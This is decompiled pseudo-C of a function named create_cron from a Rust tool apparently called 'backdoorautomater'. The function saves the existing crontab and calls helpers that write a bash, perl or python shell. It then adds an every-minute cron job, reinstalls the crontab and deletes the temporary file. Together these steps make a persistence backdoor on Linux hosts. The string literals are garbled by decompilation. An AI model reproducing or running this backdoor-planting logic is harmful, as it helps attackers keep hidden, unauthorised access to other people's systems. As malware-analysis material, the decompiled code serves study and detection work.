long long backdoorautomater::cronshell::create_cron(unsigned long long a0, struct_1 *a1, unsigned long long a2[3], unsigned long a3, unsigned int a4, struct_0 *a5)
{
    unsigned int v0;  // [bp-0x2ec]
    int v1;  // [bp-0x2e8]
    char *v2;  // [bp-0x2e8], Other Possible Types: int
    unsigned long long v3;  // [sp-0x2d8]
    unsigned long v4;  // [bp-0x2d8], Other Possible Types: unsigned long long
    int v5;  // [bp-0x2c8]
    char v6;  // [bp-0x2b8]
    int v7;  // [bp-0x2a8], Other Possible Types: char
    unsigned long v8;  // [sp-0x298], Other Possible Types: unsigned long long
    unsigned int v9;  // [sp-0x27c]
    char *v10;  // [bp-0x278], Other Possible Types: int, char
    unsigned long long v11;  // [bp-0x278]
    unsigned long long v12;  // [bp-0x270]
    unsigned long long v13;  // [bp-0x268]
    struct_1 *v14;  // [bp-0x240]
    int v15;  // [bp-0x238], Other Possible Types: char
    int v16;  // [bp-0x228]
    int v17;  // [bp-0x218], Other Possible Types: char
    unsigned long long v18;  // [bp-0x210]
    unsigned long long v19;  // [bp-0x208]
    int v20;  // [bp-0x1f8], Other Possible Types: char
    unsigned long long v21;  // [bp-0x1e8]
    struct_1 *v22;  // [bp-0x1e0]
    int v23;  // [bp-0x1d8], Other Possible Types: unsigned long long, unsigned long
    unsigned int v24;  // [bp-0x1d4]
    unsigned long long v25;  // [bp-0x1d0]
    int v26;  // [bp-0x1c8], Other Possible Types: char *, unsigned long, unsigned long long
    int v27;  // [bp-0x1c8]
    int v28;  // [bp-0x1c0], Other Possible Types: unsigned long long
    int v29;  // [bp-0x1b8], Other Possible Types: void*
    unsigned long v30;  // [bp-0x1b0]
    struct_1 *v31;  // [bp-0x100]
    int v32;  // [bp-0xf8], Other Possible Types: char
    unsigned long long v33;  // [bp-0xe8]
    void* v34;  // [bp-0xd8]
    unsigned long long v35;  // [bp-0xd0]
    void* v36;  // [bp-0xc8]
    char v37;  // [bp-0xc0]
    unsigned long long v38;  // [bp-0xb8]
    unsigned long long v39;  // [bp-0xb0]
    char v40;  // [bp-0xa8]
    int v41;  // [bp-0xa8]
    unsigned long long v42;  // [bp-0x98]
    char v43;  // [bp-0x90]
    unsigned long long v44;  // [bp-0x78]
    unsigned long long v45;  // [bp-0x70]
    unsigned long long v46;  // [bp-0x68]
    int v47;  // [bp-0x60], Other Possible Types: char
    int v48;  // [bp-0x50]
    char v49;  // [bp-0x40]
    unsigned long long v51;  // rax
    unsigned long long v52;  // rcx
    unsigned int v53;  // eax
    unsigned long long v56;  // rbp
    char v57;  // r15b
    unsigned long v58;  // r12
    unsigned long long v59;  // r14
    struct_1 *v60;  // rcx
    unsigned long long v61;  // rax
    unsigned int v62;  // ebx
    struct_1 *v63;  // rcx
    struct_1 *v64;  // rcx
    int v65;  // xmm0
    unsigned long long v66;  // rdx
    unsigned long long v67;  // rsi
    int v69;  // xmm1
    int v72;  // xmm1
    int v75;  // xmm1
    char v77;  // bl

    v51 = a2[1];
    v52 = a2[2];
    v23 = v51;
    v25 = v52 + v51;
    v53 = (char)v23.next_back();
    if (v53 != 47 && v53 != 0x110000)
        a2.push();
    v26 = v22->field_10;
    *((uint128_t *)&v23) = v22->field_0;
    *((uint128_t *)&v28) = v31->field_0;
    v30 = v31->field_10;
    alloc::str::join_generic_copy(&v10, &(char)v23, 2, 1, 0);
    v21 = v13;
    memcpy(&v20, &v10, 16);
    ::0x4612e0::core::ptr::drop_in_place<[alloc::string::String; 2]>(&(char)v23);
    v43.clone(a1);
    v37.clone(&v20);
    (char)v23.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
    v10.output((char)v23.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("crontab -l > all_cron * * * * python perl \nsh-cFailed to execute command*/crontab -rrm all_cron", 21));
    v15.expect(&v10, &g_62a8d8);
    ::0x461180::core::ptr::drop_in_place<std::process::Command>(&(char)v23);
    v10.from_utf8_lossy(*((long long *)&v17), v18);
    (char)v23.to_vec(v10.deref(), a2);
    v8 = v26;
    memcpy(&v7, &v23, 16);
    ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v10);
    backdoorautomater::sanitizer::sanitize_system_command(&v7);
    (char)v23.open("all_cronSocketV4SocketV6Syntax(\n", 8);
    if ((int)v23)
    {
        v56 = v25;
        v57 = 1;
        goto LABEL_461fa1;
    }
    else
    {
        v47.with_capacity(0x2000, v24);
        v9 = a4;
        v34 = 0;
        v35 = 8;
        v36 = 0;
        *((int128_t *)&v29) = *((int128_t *)&v49);
        v26 = v48;
        v23 = v47;
        while (true)
        {
            v10.next(&(char)v23);
            if (v11 == 9223372036854775809)
                break;
            v56 = v12;
            if (v11 != 0x8000000000000000)
            {
                v44 = v11;
                v45 = v56;
                v46 = v13;
                v34.push(&v44);
            }
            else
            {
                ::0x461060::core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&(char)v23);
                v57 = 1;
                goto LABEL_461f94;
            }
        }
        ::0x461060::core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&(char)v23);
        v58 = v9;
        v59 = v58 & 4294967295;
        if ((char)v59 == 3)
        {
            v64 = a1;
            v4 = v64->field_10;
            *((uint128_t *)&v1) = v64->field_0;
            v13 = v14->field_10;
            *((uint128_t *)&v10) = v14->field_0;
            v26 = v21;
            v23 = v20;
            v61 = backdoorautomater::cronshell::write_shell_bash(&v1, &v10, &(char)v23);
LABEL_461e3c:
            v62 = 1;
            backdoorautomater::sanitizer::sanitize_return_fn(v61);
            goto LABEL_461e50;
        }
        if ((unsigned int)v59 == 2)
        {
            v63 = a1;
            v4 = v63->field_10;
            *((uint128_t *)&v1) = v63->field_0;
            v13 = v14->field_10;
            *((uint128_t *)&v10) = v14->field_0;
            v26 = v21;
            v23 = v20;
            v61 = backdoorautomater::cronshell::write_shell_perl(&v1, &v10, &(char)v23);
            goto LABEL_461e3c;
        }
        if ((unsigned int)v59 == 1)
        {
            v60 = a1;
            v4 = v60->field_10;
            *((uint128_t *)&v1) = v60->field_0;
            v13 = v14->field_10;
            *((uint128_t *)&v10) = v14->field_0;
            v26 = v21;
            v23 = v20;
            v61 = backdoorautomater::cronshell::write_shell_pyfile(&v1, &v10, &(char)v23);
            goto LABEL_461e3c;
        }
        v57 = 1;
        v62 = 0;
LABEL_461e50:
        v65 = *((int128_t *)&(&a5->padding_0)[1]);
        v23 = "*/crontab -rrm all_cron";
        v25 = 2;
        v27 = v65;
        alloc::str::join_generic_copy(&v10, &(char)v23, 2, 1, 0);
        v33 = v13;
        memcpy(&v32, &v10, 16);
        v32.extend_from_slice(" * * * * python perl \nsh-cFailed to execute command*/crontab -rrm all_cron", 9);
        if ((char)v58 != 1)
        {
            if (!((unsigned int)v59 == 2))
                goto LABEL_461f1d;
            v66 = 5;
            v67 = "perl \nsh-cFailed to execute command*/crontab -rrm all_cron";
        }
        else
        {
            v66 = 7;
            v67 = "python perl \nsh-cFailed to execute command*/crontab -rrm all_cron";
        }
        v32.extend_from_slice(v67, v66);
LABEL_461f1d:
        v32.extend_from_slice(v38, v39);
        v26 = v33;
        v23 = v32;
        v34.push(&(char)v23);
        (char)v23.create("all_cronSocketV4SocketV6Syntax(\n", 8);
        if ((int)v23)
        {
            v56 = 2;
LABEL_461f94:
            ::0x461330::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v34);
            goto LABEL_461fa1;
        }
        v9 = v62;
        v0 = v24;
        (char)v23.into_iter(&v34);
        (char)v41.next(&(char)v23);
        if (*((long long *)&v40) != 0x8000000000000000)
        {
            do
            {
                v4 = v42;
                v1 = v41;
                v10.clone(&v1);
                v10.extend_from_slice("\nsh-cFailed to execute command*/crontab -rrm all_cron", 1);
                if (v0.write_all(v12, v13))
                {
                    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v10);
                    ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v1);
                    ::0x461580::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v23);
                    ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
                    goto LABEL_461fa1;
                }
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v10);
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v1);
                (char)v41.next(&(char)v23);
            } while (*((long long *)&v40) != 0x8000000000000000);
LABEL_461fa1:
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v7);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v15);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v37);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v43);
            if (v57)
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v20);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a5);
            if (!v57)
                return v56;
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
        }
        else
        {
            ::0x461580::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v23);
            (char)v23.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
            v10.output((char)v23.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("crontab -rrm all_cron", 10));
            v1.expect(&v10, &g_62a8f0);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v15);
            v19 = *((long long *)&v6);
            v69 = *((int128_t *)&v4);
            v17 = v5;
            v16 = v69;
            v15 = v1;
            ::0x461180::core::ptr::drop_in_place<std::process::Command>(&(char)v23);
            v10.from_utf8_lossy((long long)v17, v18);
            (char)v23.to_vec(v10.deref(), a2);
            v3 = v26;
            memcpy(&v1, &v23, 16);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v7);
            v8 = v3;
            v7 = v2;
            ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v10);
            backdoorautomater::sanitizer::sanitize_system_command(&v7);
            (char)v23.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
            v10.output((char)v23.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("crontab all_cron when inserting case_insensitive", 16));
            v1.expect(&v10, &g_62a908);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v15);
            v19 = *((long long *)&v6);
            v72 = *((int128_t *)&v3);
            v17 = v5;
            v16 = v72;
            v15 = v2;
            ::0x461180::core::ptr::drop_in_place<std::process::Command>(&(char)v23);
            v10.from_utf8_lossy((long long)v17, v18);
            (char)v23.to_vec(v10.deref(), a2);
            v3 = v26;
            memcpy(&v1, &v23, 16);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v7);
            v8 = v3;
            v7 = v2;
            ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v10);
            backdoorautomater::sanitizer::sanitize_system_command(&v7);
            (char)v23.new("sh-cFailed to execute command*/crontab -rrm all_cron", 2);
            v10.output((char)v23.arg("-cFailed to execute command*/crontab -rrm all_cron", 2).arg("rm all_cron", 11));
            v1.expect(&v10, &g_62a920);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v15);
            v19 = *((long long *)&v6);
            v75 = *((int128_t *)&v3);
            v17 = v5;
            v16 = v75;
            v15 = v2;
            ::0x461180::core::ptr::drop_in_place<std::process::Command>(&(char)v23);
            v10.from_utf8_lossy((long long)v17, v18);
            (char)v23.to_vec(v10.deref(), a2);
            v3 = v26;
            memcpy(&v1, &v23, 16);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v7);
            v8 = v3;
            v7 = v2;
            ::0x461220::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v10);
            backdoorautomater::sanitizer::sanitize_system_command(&v7);
            v23 = &g_62a938;
            v25 = 1;
            v26 = 8;
            *((uint128_t *)&v28) = 0;
            std::io::stdio::_print(&(char)v23);
            v2 = &v43;
            v10 = &v2;
            v12 = <&T as core::fmt::Display>::fmt;
            v23 = &g_62a948;
            v25 = 2;
            v29 = 0;
            v26 = &v10;
            v28 = 1;
            std::io::stdio::_print(&(char)v23);
            ::0x461110::core::ptr::drop_in_place<std::fs::File>(v0);
            v77 = v9;
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v7);
            ::0x461120::core::ptr::drop_in_place<std::process::Output>(&v15);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v37);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v43);
            if (!v77)
                ::0x461160::core::ptr::drop_in_place<alloc::string::String>(&v20);
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a5);
            if (v77)
                return 0;
            ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a1);
            v56 = 0;
        }
        ::0x461160::core::ptr::drop_in_place<alloc::string::String>(a0);
        return v56;
    }
}
